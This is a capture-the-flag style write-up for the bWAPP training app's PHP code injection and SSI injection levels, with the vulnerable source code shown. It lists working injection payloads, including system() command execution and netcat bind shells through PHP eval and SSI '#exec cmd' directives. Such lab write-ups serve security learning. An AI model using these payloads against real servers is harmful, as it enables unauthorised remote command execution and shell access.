---
title: "BWAPP PHP and SSI Injection"
date: 2019-01-21 00:00:00 +0530
categories: [Writeups]
tags: [Bwapp]
description: "BWAPP PHP and Server-Side Includes(SSI) Injection solution"
permalink: /Writeups/bwapp-php-ssi/
redirect_from:
  - /bwapp-php-ssi
  - /bwapp-php-ssi/
archived: true
---


# BWAPP A1 - Injection


## PHP Code Injection:

### LOW LEVEL :

To check whether its PHP code injectable. phpinfo() function can be used,

```
?message=phpinfo()
```

System commands also can be executed using PHP.

For windows,
```
?message=1;system('dir')
```
For linux,
```
?message=1;system('ls')
?message=1;system('nc -lvp 4444 -e /bin/bash')
```
To get a shell, execute `nc -vn *ip* 4444`.

The source code is
```
<p><i><?php @eval ("echo " . $_REQUEST["message"] . ";");?></i></p>
```

### MEDIUM LEVEL :

In this case, medium level and high level are same. The source code is 

```
<p><i><?php echo htmlspecialchars($_REQUEST["message"], ENT_QUOTES, "UTF-8");;?></i></p>
```

## Server-Side Includes SSI Injection:

### LOW LEVEL :

1st check whether `< ! # = / . " - > and [a-zA-Z0-9]` these characters should take without any sanitization. After that, we can inject some payload.

Payloads,
```
<!--#exec cmd="ls" -->
<!--#exec cmd="nc -lvp 8888 -e /bin/bash"-->
```

To get a shell, execute `nc -nv *ip* 8888`. 

### MEDIUM LEVEL :

In this level `"` this character is geting sanatized. we can check this using a sample input `< ! # = / . " - > and [a-zA-Z0-9]` and the output is `< ! # = / . \" - > And [a-zA-Z0-9]`.
In which `\"` doublequote is sanitized to prevent the payload with this character.

payload,
```
<!--#exec cmd=ls -->
```

The source code is
```
$line = '<p>Hello ' . $firstname . ' ' . $lastname . ',</p><p>Your IP address is:' . '</p><h1><!--#echo var="REMOTE_ADDR" --></h1>';
```

## Reference

```
https://www.owasp.org/index.php/Testing_for_SSI_Injection_(OTG-INPVAL-009)
https://www.owasp.org/index.php/Server-Side_Includes_(SSI)_Injection
https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet
```
